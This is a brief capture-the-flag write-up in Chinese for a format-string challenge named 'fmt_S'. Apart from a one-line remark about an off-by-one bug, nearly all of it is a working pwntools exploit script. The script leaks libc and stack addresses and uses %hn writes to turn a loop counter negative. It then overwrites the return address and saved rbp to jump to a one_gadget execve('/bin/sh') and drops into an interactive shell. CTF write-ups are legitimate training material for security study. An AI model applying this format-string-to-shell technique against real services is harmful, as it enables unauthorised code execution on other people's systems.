# fmt_S

通货膨胀疑似太严重了。依稀记得前几届类似的题有300-500分，今年就只有250了

my_read处存在off by one，可以溢出到flag将其置为0
```py
from pwn import *
p=remote("localhost",39813)
def fmt(payload):
    p.sendlineafter("him...",payload)
def atk(payload):
    p.sendafter("battle!",payload)
def fmt_with_chain(addr,payload,next_attack=True):
    offset=17
    offset2=offset+30
    fmt(f"%{addr&0xffff}c%{offset}$hn")
    atk('a'*8)
    fmt(f"%{payload&0xffff}c%{offset2}$hn")
    if next_attack:
        atk('a'*8)
    else:
        atk(b'\x00'*7)
fmt("%8$p,%13$p")
p.recvline()
content=p.recvline(keepends=False)
libc=int(content.split(b',')[1],16)-0x29d90
one_gadget=libc+0xebd43
"""
0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
"""
ret=int(content.split(b',')[0],16)+8
counter=ret-0xc
fake_rbp=ret+0x78
rbp=ret-8
atk('a'*8)
fmt_with_chain(counter+2,0xffff) #将while循环的counter改为负数，获取多次漏洞利用机会
fmt_with_chain(ret,one_gadget)
fmt_with_chain(ret+2,one_gadget>>16)
fmt_with_chain(rbp,fake_rbp) #给one_gadget布置好rbp和对应的值（[rbp-0x70]=null）。直接返回的话rbp是1
fmt_with_chain(rbp+2,fake_rbp>>16)
fmt_with_chain(rbp+4,fake_rbp>>32)
fmt_with_chain(counter+2,0,False) #等一下我突然意识到好像不需要这步？不过无伤大雅
p.interactive()
```